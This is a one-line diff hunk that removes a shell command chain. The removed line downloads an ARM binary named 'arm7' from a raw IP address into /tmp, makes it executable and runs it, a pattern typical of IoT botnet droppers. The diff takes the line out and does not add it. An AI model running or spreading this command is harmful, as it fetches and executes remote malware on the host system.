@@ -1,1 +1,0 @@
-cd /tmp; rm -rf arm7; wget http://176.65.148.37/arm7; chmod 755 arm7; ./arm7 bigbbos
